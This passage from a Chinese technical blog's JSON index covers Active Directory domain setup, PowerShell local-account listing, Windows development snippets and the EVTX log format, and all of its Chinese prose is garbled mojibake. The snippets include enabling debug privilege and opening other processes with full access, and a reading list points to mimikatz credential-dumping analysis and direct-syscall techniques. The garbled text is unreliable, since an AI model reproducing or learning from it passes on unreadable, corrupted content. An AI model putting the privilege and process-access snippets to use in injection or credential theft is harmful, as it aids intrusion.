ä¸‹è½½å®‰è£…ç³»ç»Ÿ åœ¨ MSDN æ‰¾åˆ° windows server 2016 ä¸‹è½½ï¼Œä¸‹è½½å®Œæˆååˆ›å»º VM è™šæ‹Ÿæœºï¼Œå®‰è£… windows server 2016 ç³»ç»Ÿã€‚å®‰è£…çš„æ—¶å€™é€‰æ‹©å¸¦å›¾å½¢ç•Œé¢çš„ã€‚ MSDNç½‘ç«™ï¼š https://msdn.itellyou.cn/ é…ç½®ADåŸŸç¯å¢ƒ ADåŸŸç›¸å…³æ–‡ç« ï¼š ã€winapiã€‘è·å–ç³»ç»ŸåŸŸå ã€ADåŸŸã€‘ å®‰è£… DNS æœåŠ¡å™¨ ä¿®æ”¹ipä¸ºé™æ€ip æ·»åŠ  DNS æœåŠ¡å™¨ å¼€å§‹ä¹‹å‰ -&gt; ä¸‹ä¸€æ­¥ å®‰è£…ç±»å‹ -&gt; ä¸‹ä¸€æ­¥ æœåŠ¡å™¨é€‰æ‹© -&gt; ä¸‹ä¸€æ­¥ æœåŠ¡å™¨è§’è‰² åŠŸèƒ½ -&gt; ä¸‹ä¸€æ­¥ ç¡®è®¤ -&gt; å®‰è£… ç­‰å¾…å®‰è£…ç»“æŸ å®‰è£… Active Directory åŸŸæœåŠ¡ æ·»åŠ è§’è‰²å’ŒåŠŸèƒ½ å¼€å§‹ä¹‹å‰ -&gt; ä¸‹ä¸€æ­¥ å®‰è£…ç±»å‹ -&gt; ä¸‹ä¸€æ­¥ æœåŠ¡å™¨é€‰æ‹© -&gt; ä¸‹ä¸€æ­¥ æœåŠ¡å™¨è§’è‰² -&gt; Active Directory åŸŸæœåŠ¡ æ·»åŠ è§’è‰²åŠŸèƒ½å‘å¯¼ -&gt; æ·»åŠ åŠŸèƒ½ æœåŠ¡å™¨è§’è‰² -&gt; ä¸‹ä¸€æ­¥ åŠŸèƒ½ -&gt; ä¸‹ä¸€æ­¥ AD DS -&gt; ä¸‹ä¸€æ­¥ ç¡®è®¤ æœ€åç­‰å¾…å®‰è£…å®Œæˆå³å¯ã€‚ é…ç½® AD DS å®‰è£…å®Œæˆåï¼Œç‚¹å‡»å³ä¸Šè§’ æ›´å¤š å¼€å§‹é…ç½® å°†æ­¤æœåŠ¡å™¨æå‡ä¸ºåŸŸæ§åˆ¶å™¨ éƒ¨ç½²é…ç½® -&gt; æ·»åŠ æ–°æ— å¦‚æœæ˜¯å…¬å¸çš„é¦–å°åŸŸæ§åˆ¶å™¨ï¼Œé€‰æ‹©â€œæ·»åŠ æ–°æ—â€ï¼Œè‡ªå®šä¹‰å…¬å¸çš„æ ¹åŸŸåï¼ŒåŸŸåå‘½ä»¤è§„åˆ™xxx.comï¼Œä¸ºä»€ä¹ˆè¦ç”¨.comç»“å°¾å‘¢ï¼Ÿä¸€èˆ¬æ¥è¯´.comæ³¨å†Œç”¨æˆ·ä¸ºå…¬å¸æˆ–ä¼ä¸šã€‚ åŸŸæ§åˆ¶å™¨é€‰é¡¹ -&gt; å¯†ç  -&gt; ä¸‹ä¸€æ­¥ æ–°æ—å’Œæ ¹åŸŸçš„åŠŸèƒ½çº§åˆ«ï¼Œé»˜è®¤Windows Server 2016ã€‚ æŒ‡å®šåŸŸæ§åˆ¶å™¨åŠŸèƒ½ï¼ŒåŸŸåç³»ç»Ÿï¼ˆDNSï¼‰æœåŠ¡å™¨ï¼Œå…¨å±€ç¼–å½•ï¼ˆGCï¼‰éƒ½æ˜¯é»˜è®¤å®‰è£…åœ¨æ­¤åŸŸæ§æœåŠ¡å™¨ä¸Šã€‚ è®¾ç½®ç›®å½•æœåŠ¡å™¨å«è¿˜åŸæ¨¡å¼ï¼ˆDSRMï¼‰å¯†ç ã€‚Directory Services Restore Modeï¼Œç®€ç§°DSRMï¼Œåˆç§°ç›®å½•æœåŠ¡æ¢å¤æ¨¡å¼ã€‚æ˜¯WindowsåŸŸæ§åˆ¶å™¨çš„æœåŠ¡å™¨å®‰å…¨æ¨¡å¼å¯åŠ¨é€‰é¡¹ã€‚DSRMå…è®¸ç®¡ç†å‘˜ç”¨æ¥ä¿®å¤æˆ–è¿˜åŸä¿®å¤æˆ–é‡å»ºæ´»åŠ¨ç›®å½•æ•°æ®åº“ã€‚ DNS é€‰é¡¹ -&gt; ä¸‹ä¸€æ­¥ å…¶ä»–é€‰é¡¹ -&gt; ä¸‹ä¸€æ­¥ è·¯å¾„ AD DSæ•°æ®åº“ã€æ—¥å¿—æ–‡ä»¶å’ŒSYSVOLçš„æ–‡ä»¶å­˜å‚¨çš„é»˜è®¤ä½ç½®ã€‚ Ntds.ditï¼šå­˜å‚¨æ´»åŠ¨ç›®å½•æ•°æ®åº“æ–‡ä»¶ï¼Œå­˜å‚¨åŸŸæ§åˆ¶å™¨çš„æ‰€æœ‰æ´»åŠ¨ç›®å½•å¯¹è±¡ã€‚ Edb*.logï¼šå­˜å‚¨æ—¥å¿—æ–‡ä»¶ï¼Œé»˜è®¤æ—¥å¿—æ–‡ä»¶Edb.logã€‚ SYSVOLï¼Œå®ƒæ˜¯ç”¨æ¥å­˜å‚¨åŸŸå…¬å…±æ–‡ä»¶æœåŠ¡å™¨å‰¯æœ¬çš„å…±äº«æ–‡ä»¶å¤¹ï¼Œä¾‹å¦‚æˆ‘ä»¬ç”¨å¾—æœ€å¤šçš„ç»„ç­–ç•¥è®¾ç½®ã€è„šæœ¬ç­‰éƒ½æ˜¯å­˜åœ¨è¿™ä¸ªå…±äº«ç›®å½•ä¸­çš„ï¼Œscriptè„šæœ¬æ–‡ä»¶ï¼ŒNetlogonå…±äº«æ–‡ä»¶ï¼ŒSysvolå…±äº«æ–‡ä»¶ã€‚ æŸ¥çœ‹é€‰é¡¹ -&gt; ä¸‹ä¸€æ­¥ å…ˆå†³æ¡ä»¶æ£€æŸ¥ -&gt; å®‰è£… ç­‰å¾…å®‰è£…ç»“æœ å®‰è£…ç»“æŸï¼Œå®‰è£…å®Œæˆåéœ€è¦é‡å¯ ç›¸å…³æ–‡ç«  ã€ADã€‘ç”¨æˆ·å±æ€§ ã€ADã€‘åŸŸ ã€ADã€‘è·å–åŸŸç”¨æˆ·ä¿¡æ¯","tags":[{"name":"windows/AD","slug":"windows-AD","permalink":"https://hodlyounger.github.io/tags/windows-AD/"},{"name":"ç¯å¢ƒæ­å»º","slug":"ç¯å¢ƒæ­å»º","permalink":"https://hodlyounger.github.io/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"ç¯å¢ƒæ­å»º","slug":"A-OS/Windows/ç¯å¢ƒæ­å»º","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}]},{"title":"ã€Powershellã€‘è·å–æœ¬åœ°ç”¨æˆ·å’Œç»„","date":"2024-01-23T16:00:00.000Z","path":"A_OS/Windows/cmd/ã€Powershellã€‘è·å–æœ¬åœ°ç”¨æˆ·å’Œç»„/","text":"æ¦‚è¿°ï¼šåœ¨ Power Shell ä¸­è·å–æœ¬åœ°ç”¨æˆ·å’Œç»„ï¼Œä»¥åŠç»„æˆå‘˜ è·å–æœ¬åœ°ç›¸å…³çš„å‘½ä»¤ 1234567891011121314151617181920212223242526PS C:\\Users\\holdy&gt; get-command -name *local*# è¾“å‡ºå¦‚ä¸‹æ‰€ç¤ºï¼š# CommandType Name Version Source# ----------- ---- ------- ------# Function Enable-BCLocal 1.0.0.0 BranchCache# Function Get-DscLocalConfigurationManager 1.1 PSDesiredStateConfiguration# Cmdlet Add-LocalGroupMember 1.0.0.0 Microsoft.PowerShell.LocalAccounts# Cmdlet Disable-LocalUser 1.0.0.0 Microsoft.PowerShell.LocalAccounts# Cmdlet Enable-LocalUser 1.0.0.0 Microsoft.PowerShell.LocalAccounts# Cmdlet Get-LocalGroup 1.0.0.0 Microsoft.PowerShell.LocalAccounts# Cmdlet Get-LocalGroupMember 1.0.0.0 Microsoft.PowerShell.LocalAccounts# Cmdlet Get-LocalUser 1.0.0.0 Microsoft.PowerShell.LocalAccounts# Cmdlet Get-WinSystemLocale 2.1.0.0 International# Cmdlet Import-LocalizedData 3.1.0.0 Microsoft.PowerShell.Utility# Cmdlet New-LocalGroup 1.0.0.0 Microsoft.PowerShell.LocalAccounts# Cmdlet New-LocalUser 1.0.0.0 Microsoft.PowerShell.LocalAccounts# Cmdlet Remove-LocalGroup 1.0.0.0 Microsoft.PowerShell.LocalAccounts# Cmdlet Remove-LocalGroupMember 1.0.0.0 Microsoft.PowerShell.LocalAccounts# Cmdlet Remove-LocalUser 1.0.0.0 Microsoft.PowerShell.LocalAccounts# Cmdlet Rename-LocalGroup 1.0.0.0 Microsoft.PowerShell.LocalAccounts# Cmdlet Rename-LocalUser 1.0.0.0 Microsoft.PowerShell.LocalAccounts# Cmdlet Set-DscLocalConfigurationManager 1.1 PSDesiredStateConfiguration# Cmdlet Set-LocalGroup 1.0.0.0 Microsoft.PowerShell.LocalAccounts# Cmdlet Set-LocalUser 1.0.0.0 Microsoft.PowerShell.LocalAccounts# Cmdlet Set-WinSystemLocale 2.1.0.0 International è·å–æœ¬åœ°ç”¨æˆ· 12345678910111213PS C:\\Users\\holdy&gt; Get-LocalUser# Name Enabled Description# ---- ------- -----------# Administrator False ç®¡ç†è®¡ç®—æœº(åŸŸ)çš„å†…ç½®å¸æˆ·# DefaultAccount False ç³»ç»Ÿç®¡ç†çš„ç”¨æˆ·å¸æˆ·ã€‚# defaultuser100001 True# Guest False ä¾›æ¥å®¾è®¿é—®è®¡ç®—æœºæˆ–è®¿é—®åŸŸçš„å†…ç½®å¸æˆ·# holdy True# localtest True# localtestEmpty True# localtestEmpty1 True# WDAGUtilityAccount False ç³»ç»Ÿä¸º Windows Defender åº”ç”¨ç¨‹åºé˜²æŠ¤æ–¹æ¡ˆç®¡ç†å’Œä½¿ç”¨çš„ç”¨æˆ·å¸æˆ·ã€‚ è·å–æœ¬åœ°ç®¡ç†å‘˜ç»„ 12345PS C:\\Users\\holdy&gt; Get-LocalGroup Administrators# Name Description# ---- -----------# Administrators ç®¡ç†å‘˜å¯¹è®¡ç®—æœº/åŸŸæœ‰ä¸å—é™åˆ¶çš„å®Œå…¨è®¿é—®æƒ è·å–æœ¬åœ°ç®¡ç†å‘˜ç»„æˆå‘˜ 123456PS C:\\Users\\holdy&gt; Get-LocalGroupMember Administrators# ObjectClass Name PrincipalSource# ----------- ---- ---------------# ç”¨æˆ· MONTARIUS-WIN11\\Administrator Local# ç”¨æˆ· MONTARIUS-WIN11\\holdy MicrosoftAccount è·å–æœ¬åœ°ç”¨æˆ·ç»„ 12345PS C:\\Users\\holdy&gt; Get-LocalGroup users# Name Description# ---- -----------# Users é˜²æ­¢ç”¨æˆ·è¿›è¡Œæœ‰æ„æˆ–æ— æ„çš„ç³»ç»ŸèŒƒå›´çš„æ›´æ”¹ï¼Œä½†æ˜¯å¯ä»¥è¿è¡Œå¤§éƒ¨åˆ†åº”ç”¨ç¨‹åº è·å–æœ¬åœ°ç”¨æˆ·ç»„æˆå‘˜ 12345678910PS C:\\Users\\holdy&gt; Get-LocalGroupMember users# ObjectClass Name PrincipalSource# ----------- ---- ---------------# ç”¨æˆ· MONTARIUS-WIN11\\holdy MicrosoftAccount# ç”¨æˆ· MONTARIUS-WIN11\\localtest Local# ç”¨æˆ· MONTARIUS-WIN11\\localtestEmpty Local# ç”¨æˆ· MONTARIUS-WIN11\\localtestEmpty1 Local# ç»„ NT AUTHORITY\\Authenticated Users Unknown# ç»„ NT AUTHORITY\\INTERACTIVE Unknown","tags":[{"name":"powershell","slug":"powershell","permalink":"https://hodlyounger.github.io/tags/powershell/"},{"name":"windows/è´¦æˆ·","slug":"windows-è´¦æˆ·","permalink":"https://hodlyounger.github.io/tags/windows-%E8%B4%A6%E6%88%B7/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"cmd","slug":"A-OS/Windows/cmd","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/cmd/"}]},{"title":"windows å¯¼è¯»","date":"2024-01-23T06:09:33.299Z","path":"A_OS/Windows/ã€winã€‘Windows å¯¼è¯»ä¸æ¨è/","text":"ç›¸å…³å¼€æºé¡¹ç›®ï¼š [ ] imaro/RpcEnum at 3251b88a1d03a2f039ec22df7ce52ff851016b12 [ ] holdyounger Start List/ Windows å¥½æ–‡æ¨è [ ] Analysing RPC With Ghidra and Neo4j - XPN InfoSec Blog [ ] ç½‘ç»œé¶åœºå®æˆ˜-å®‰å…¨å¼€å‘ä¹‹ç›´æ¥ç³»ç»Ÿè°ƒç”¨_ntcreatethreadex-CSDNåšå®¢ å†…æ ¸ç›¸å…³ï¼š [ ] å‡ ä¸ªSyscallé¡¹ç›®çš„å­¦ä¹ è®°å½• - å…ˆçŸ¥ç¤¾åŒº SAM æ³¨å†Œè¡¨ï¼š mimikatzæºç åˆ†æ-lsadumpæ¨¡å—ï¼ˆæ³¨å†Œè¡¨ï¼‰-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å°","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"}]},{"title":"ã€windowsã€‘å¼€å‘æ‰‹å†Œ-å¸¸ç”¨ä»£ç æ®µåŠç»éªŒæ•´ç†","date":"2024-01-23T06:09:29.070Z","path":"A_OS/Windows/ã€winã€‘å¼€å‘ç»éªŒ/","text":"[toc] å¸¸ç”¨ä»£ç æ®µ 0x01 GetProcessId-è·å–è¿›ç¨‹id è·å–è¿›ç¨‹id CreateToolhelp32Snapshot Process32First Process32Next 1234567891011121314151617DWORD processNameToId(LPCTSTR lpszProcessName)&#123; HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 pe; pe.dwSize = sizeof(PROCESSENTRY32); if (!Process32First(hSnapshot, &amp;pe)) &#123; MessageBox(NULL, &quot;The frist entry of the process list has not been copyied to the buffer&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0; &#125; while (Process32Next(hSnapshot, &amp;pe)) &#123; if (!strcmp(lpszProcessName, pe.szExeFile)) &#123; return pe.th32ProcessID; &#125; &#125; return 0;&#125; 12345DWORD dwProcessId = processNameToId(szExeName);if (dwProcessId == 0) &#123; MessageBox(NULL, &quot;The target process have not been found !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return -1;&#125; 0x04 OpenProcess-æ‰“å¼€ç›®æ ‡è¿›ç¨‹ OpenProcess 12345HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);if (!hTargetProcess) &#123; MessageBox(NULL, &quot;Open target process failed !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK); return 0;&#125; 0x03 IsWow64-åˆ¤æ–­ç›®æ ‡è¿›ç¨‹æ˜¯ä¸æ˜¯64ä½ 123456789101112131415BOOL IsWow64(HANDLE hProcess)&#123; typedef BOOL(WINAPI* LPFN_ISWOW64PROCESS) (HANDLE, PBOOL); LPFN_ISWOW64PROCESS fnIsWow64Process; BOOL bIsWow64 = FALSE; fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress( GetModuleHandle(&quot;kernel32&quot;), &quot;IsWow64Process&quot;); if (NULL != fnIsWow64Process) &#123; fnIsWow64Process(hProcess, &amp;bIsWow64); &#125; return bIsWow64;&#125; 0x04 Is64BitOs-åˆ¤æ–­å½“å‰æœºå™¨æ˜¯ä¸æ˜¯ 64bitã€‚ ä¸»è¦ç”¨çš„APIä¸º GetNativeSystemInfo 12345678910111213141516BOOL Is64BitOS()&#123; typedef VOID(WINAPI* LPFN_GetNativeSystemInfo)(__out LPSYSTEM_INFO lpSystemInfo); LPFN_GetNativeSystemInfo fnGetNativeSystemInfo = (LPFN_GetNativeSystemInfo)GetProcAddress(GetModuleHandle(&quot;kernel32&quot;), &quot;GetNativeSystemInfo&quot;); if (fnGetNativeSystemInfo) &#123; SYSTEM_INFO stInfo = &#123; 0 &#125;; fnGetNativeSystemInfo(&amp;stInfo); if (stInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64 || stInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) &#123; return TRUE; &#125; &#125; return FALSE;&#125; 0x05 EnableDebugPriv-æœ¬åœ°ææƒ OpenProcessToken LookupPrivilegeValue AdjustTokenPrivileges 123456789101112131415161718192021bool enableDebugPriv()&#123; HANDLE hToken; LUID sedebugnameValue; TOKEN_PRIVILEGES tkp; if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken)) &#123; return false; &#125; if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;sedebugnameValue)) &#123; CloseHandle(hToken); return false; &#125; tkp.PrivilegeCount = 1; tkp.Privileges[0].Luid = sedebugnameValue; tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, sizeof(tkp), NULL, NULL)) &#123; CloseHandle(hToken); return false; &#125; return true;&#125; getProcessAddr-è·å–ç›®æ ‡è¿›ç¨‹é¦–åœ°å€ ä¸»è¦é€»è¾‘ï¼Œè·å–ç›®æ ‡è¿›ç¨‹çš„å¿«ç…§ï¼Œæ£€ç´¢ç¬¬ä¸€ä¸ªæ¨¡å—çš„ä¿¡æ¯å¹¶è¿”å›æ¨¡å—çš„ modBaseAddr CreateToolhelp32Snapshotï¼šè·å–æŒ‡å®šè¿›ç¨‹ä»¥åŠè¿™äº›è¿›ç¨‹ä½¿ç”¨çš„å †ã€æ¨¡å—å’Œçº¿ç¨‹çš„å¿«ç…§ã€‚ Module32First MODULEENTRY32 1234567891011121314151617181920212223242526272829303132//è·å–ç›®æ ‡è¿›ç¨‹é¦–åœ°å€BOOL CImageBloodDlg::getProcessAddr(DWORD dwPID, DWORD&amp; baseAddr)&#123; HANDLE hModuleSnap = INVALID_HANDLE_VALUE; MODULEENTRY32 me32; // åœ¨ç›®æ ‡è¿›ç¨‹ä¸­è·å–æ‰€æœ‰è¿›ç¨‹çš„snapshot hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID); if (hModuleSnap == INVALID_HANDLE_VALUE) &#123; AfxMessageBox(_T(&quot;CreateToolhelp32Snapshot (of modules) fail&quot;)); return(FALSE); &#125; // è®¾ç½®MODULEENTRY32æ•°æ®ç»“æ„å¤§å°å­—æ®µ me32.dwSize = sizeof(MODULEENTRY32); //æ£€ç´¢ç¬¬ä¸€ä¸ªæ¨¡å—çš„ä¿¡æ¯ï¼Œä¸æˆåŠŸåˆ™è¿”å› if (!Module32First(hModuleSnap, &amp;me32)) &#123; AfxMessageBox(_T(&quot;Module32First fail&quot;)); // æ˜¾ç¤ºè°ƒç”¨å¤±è´¥ CloseHandle(hModuleSnap); // æ¸…é™¤å¥æŸ„å¯¹è±¡ return(FALSE); &#125; // ä»me32ä¸­å¾—åˆ°åŸºå€ baseAddr = (DWORD)me32.modBaseAddr; // åˆ«å¿˜äº†æœ€åæ¸…é™¤æ¨¡å—å¥æŸ„å¯¹è±¡ CloseHandle(hModuleSnap); return(TRUE);&#125; è·å–PEB æ¥æºï¼šlibpeconv/libpeconv/src/peb_lookup.cppÂ· hasherezade/libpeconv 1234567891011121314151617181920inline PPEB get_peb()&#123;#if defined(_WIN64) return (PPEB)__readgsqword(0x60);#else return (PPEB)__readfsdword(0x30);/*//alternative way to fetch it: LPVOID PEB = NULL; __asm &#123; mov eax, fs:[30h] mov PEB, eax &#125;; return (PPEB)PEB; or: LPVOID PEB = RtlGetCurrentPeb();*/#endif&#125; åˆ¤æ–­ç£ç›˜æ—¶å€™å¼€å¯äº†å†™ä¿æŠ¤ 123456789101112131415161718192021222324252627282930313233343536373839404142434445/** * @ brief åˆ¤æ–­ç£ç›˜æ˜¯å¦å¼€å¯äº†å†™ä¿æŠ¤ * @ param wcDrive ç£ç›˜ç›˜ç¬¦*/BOOL IsWriteProtected( TCHAR wcDrive )&#123; TCHAR szPath[10] = L&quot;\\\\\\\\.\\\\A:\\0&quot;; szPath[4] = wcDrive; HANDLE hDevice = CreateFile(szPath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL); if (hDevice == INVALID_HANDLE_VALUE) &#123; return FALSE; &#125; BOOL bRet = FALSE; DWORD dwBytesReturn = 0; BOOL bWriteable = ::DeviceIoControl(hDevice, IOCTL_DISK_IS_WRITABLE, NULL, 0, NULL, 0, (LPDWORD) &amp;dwBytesReturn, NULL); if (bWriteable) &#123; bRet = FALSE; &#125; else &#123; bRet = ::GetLastError() == ERROR_WRITE_PROTECT ? TRUE:FALSE; &#125; ::CloseHandle(hDevice); return bRet;&#125; ç»éªŒ 0x01 ä¸´æ—¶å…³é—­ç¼–è¯‘å‘Šè­¦ 1234#pragma warning(push)#pragma warning(disable:4305) pCandidate=(VOID PTR_T PTR_T)ModuleSectionInfo.pBase;#pragma warning(pop) 0x02 ä¿®æ”¹ç»“æ„ä½“å¯¹é½æ–¹å¼ ä½¿ç”¨ #pragma pack(1) ä¹‹åï¼Œç»“æ„ä½“æœ€å°å¯¹é½çš„å­—èŠ‚ä¸º1ã€‚å¥½å¤„æ˜¯å¯ä»¥è®©ç¼–è¯‘å™¨æŒ‰ç…§æ›´ç´§å‡‘çš„æ–¹å¼å­˜å‚¨æ•°æ®ï¼Œä»è€ŒèŠ‚çœå†…å­˜ç©ºé—´ã€‚ 1234567891011121314151617181920struct TestStruct &#123; char a; // å ç”¨1å­—èŠ‚ int b; // å ç”¨1å­—èŠ‚ï¼Œä¸aå¯¹é½ double c; // å ç”¨8å­—èŠ‚ï¼Œä¸bå¯¹é½ &#125;; #pragma pack(1) struct TestPackStruct &#123; char a; // å ç”¨1å­—èŠ‚ int b; // å ç”¨1å­—èŠ‚ï¼Œä¸aå¯¹é½ double c; // å ç”¨8å­—èŠ‚ï¼Œä¸bå¯¹é½ &#125;; #pragma pack()/*TestStruct size:16TestPackStruct size:13*/ 0x03 æœªä½¿ç”¨çš„å‚æ•°ã€å˜é‡ æ¶ˆé™¤æœªä½¿ç”¨å‚æ•°å’Œç»“æ„ä½“è­¦å‘Šå¯ä»¥ä½¿ç”¨ä¸‹é¢å‡ ä¸ªå®ï¼š 1234#define UNREFERENCED_PARAMETER(P) &#123;(P) = (P);&#125;#define UNREFERENCED_LOCAL_VARIABLE(V) &#123;(V) = (V);&#125;#define DBG_UNREFERENCED_PARAMETER(P) (P)#define DBG_UNREFERENCED_LOCAL_VARIABLE(V) (V)","tags":[{"name":"Windows","slug":"Windows","permalink":"https://hodlyounger.github.io/tags/Windows/"},{"name":"experience","slug":"experience","permalink":"https://hodlyounger.github.io/tags/experience/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"}]},{"title":"Windows äº‹ä»¶æ—¥å¿—æ–‡ä»¶â€”â€”EVTXæ–‡ä»¶","date":"2024-01-23T06:09:12.434Z","path":"A_OS/Windows/æ–‡ä»¶ä¸ç»“æ„ä½“/ã€WINã€‘EVTXæ–‡ä»¶/","text":"æ¦‚è¿°ï¼š.evtx æ˜¯ Windows äº‹ä»¶æ—¥å¿—æ–‡ä»¶çš„æ‰©å±•åã€‚è¿™äº›æ–‡ä»¶é€šå¸¸åŒ…å«ç³»ç»Ÿæˆ–åº”ç”¨ç¨‹åºçš„æ“ä½œä¿¡æ¯ï¼Œå¦‚ç³»ç»Ÿè­¦å‘Šã€é”™è¯¯ã€ä¿¡æ¯äº‹ä»¶ç­‰ã€‚è¿™äº›æ–‡ä»¶ä¸»è¦è¢«ç³»ç»Ÿç®¡ç†å‘˜ç”¨æ¥è¿›è¡Œæ•…éšœæ’æŸ¥å’Œç³»ç»Ÿç›‘æ§ã€‚ Windows äº‹ä»¶æŸ¥çœ‹å™¨æ˜¯æŸ¥çœ‹ .evtx æ–‡ä»¶çš„ä¸»è¦å·¥å…·ï¼Œä½ å¯ä»¥åœ¨ Windows çš„æ§åˆ¶é¢æ¿æˆ–è€…é€šè¿‡åœ¨ â€œè¿è¡Œâ€ å¯¹è¯æ¡†ä¸­è¾“å…¥ eventvwr.msc æ¥æ‰“å¼€å®ƒã€‚åœ¨äº‹ä»¶æŸ¥çœ‹å™¨ä¸­ï¼Œä½ å¯ä»¥æŸ¥çœ‹ã€å¯¼å‡ºå’Œæ¸…é™¤äº‹ä»¶æ—¥å¿—ï¼Œè¿˜å¯ä»¥åˆ›å»ºå’Œç®¡ç†äº‹ä»¶è®¢é˜…ã€‚ .evtx æ–‡ä»¶æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ‰€ä»¥ç›´æ¥ç”¨æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€å®ƒä»¬å¹¶ä¸èƒ½çœ‹åˆ°æœ‰ç”¨çš„ä¿¡æ¯ã€‚æœ‰ä¸€äº›ç¬¬ä¸‰æ–¹å·¥å…·ï¼Œå¦‚ NirSoft çš„ MyEventViewer æˆ– Log Parserï¼Œå¯ä»¥è§£æ .evtx æ–‡ä»¶å¹¶ä»¥æ›´æ˜“äºç†è§£çš„æ ¼å¼æ˜¾ç¤ºäº‹ä»¶ã€‚ evtxæ–‡ä»¶æ¦‚è¿° æ¦‚è¿° .evtxæ˜¯Windowsäº‹ä»¶æ—¥å¿—æ–‡ä»¶çš„æ‰©å±•å,å…¨ç§°ä¸ºWindows XMLäº‹ä»¶æ—¥å¿—æ ¼å¼ã€‚ Windowsäº‹ä»¶æ—¥å¿—ç”¨äºè®°å½•ç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºåœ¨è¿è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿçš„ä¸åŒäº‹ä»¶ã€‚.evtxæ–‡ä»¶é‡‡ç”¨XMLæ ¼å¼æ¥å­˜å‚¨è¿™äº›äº‹ä»¶ä¿¡æ¯ã€‚æ¯ä¸ªevtxæ–‡ä»¶é€šå¸¸å¯¹åº”ä¸€ä¸ªç‰¹å®šçš„æ—¥å¿—ç±»å‹,å¦‚: â€¢ System.evtx - è®°å½•ç³»ç»Ÿäº‹ä»¶ â€¢ Application.evtx - è®°å½•åº”ç”¨ç¨‹åºäº‹ä»¶ â€¢ Security.evtx - è®°å½•å®‰å…¨å®¡æ ¸äº‹ä»¶ å¦‚ä½•æŸ¥çœ‹ .evtxæ–‡ä»¶å¯ä»¥ä½¿ç”¨äº‹ä»¶æŸ¥çœ‹å™¨(Windows Event Viewer)æ¥æŸ¥çœ‹å’Œåˆ†æã€‚æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨PowerShellã€evtparserç­‰å·¥å…·æ¥è§£æevtxæ–‡ä»¶,ä¾‹å¦‚: è·å–evtxæ–‡ä»¶ä¸­çš„äº‹ä»¶IDä¸º1000çš„æ‰€æœ‰äº‹ä»¶: 1Get-WinEvent -Path application.evtx | Where &#123;$_.Id -eq &quot;1000&quot;&#125; æ ¹æ®evtxæ–‡ä»¶ä¸­çš„äº‹ä»¶æ¶ˆæ¯ç­›é€‰äº‹ä»¶: 1Get-WinEvent -Path application.evtx | Where &#123;$_.Message -like &quot;*some message*&quot;&#125; å¯¼å‡ºevtxæ–‡ä»¶ä¸­çš„æ‰€æœ‰äº‹ä»¶åˆ°CSVæ–‡ä»¶: 1Get-WinEvent -Path application.evtx | Export-CSV -Path events.csv ä½¿ç”¨evtparserè§£æevtxæ–‡ä»¶ evtparser.py application.evtx &gt; events.log evtxæ–‡ä»¶çš„ä¸»è¦ä½œç”¨æ˜¯è¿›è¡Œç³»ç»Ÿç›‘æ§ã€å®‰å…¨å®¡è®¡å’Œäº‹ä»¶åˆ†æã€‚é€šè¿‡åˆ†æevtxæ–‡ä»¶,æˆ‘ä»¬å¯ä»¥: äº†è§£ç³»ç»Ÿæˆ–åº”ç”¨ç¨‹åºçš„è¿è¡ŒçŠ¶å†µå’Œé‡åˆ°çš„é—®é¢˜ æ£€æµ‹ç³»ç»Ÿæˆ–åº”ç”¨ç¨‹åºçš„æ½œåœ¨å®‰å…¨å¨èƒ åˆ†ææŸä¸ªæ—¶é—´æ®µå†…çš„ç³»ç»Ÿäº‹ä»¶,æŸ¥æ‰¾å¯èƒ½å¯¼è‡´é—®é¢˜çš„å˜åŒ– å®¡è®¡å¯¹ç³»ç»Ÿçš„è®¿é—®å’Œæ›´æ”¹ç­‰ æ‰€ä»¥,ç†Ÿæ‚‰evtxæ–‡ä»¶æ ¼å¼å’Œå¦‚ä½•åˆ†æevtxæ–‡ä»¶æ˜¯ä¿¡æ¯å®‰å…¨äººå‘˜å’Œç³»ç»Ÿç®¡ç†å‘˜çš„é‡è¦æŠ€èƒ½ä¹‹ä¸€ã€‚ EVTX æ–‡ä»¶ç»“æ„ evtxæ–‡ä»¶ä¸»è¦ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š file header ï¼ˆæ–‡ä»¶å¤´ï¼‰ chunks 